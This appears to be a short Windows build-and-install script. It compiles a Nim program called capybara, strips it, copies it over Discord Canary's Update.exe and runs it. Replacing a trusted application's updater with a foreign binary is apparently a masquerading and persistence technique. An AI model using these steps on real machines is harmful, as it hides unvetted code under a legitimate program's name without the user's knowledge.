nim -d:release --opt:size c capybara.nim
strip -s capybara.exe
copy capybara.exe %localappdata%\DiscordCanary\Update.exe
%localappdata%\DiscordCanary\Update.exe --uninstall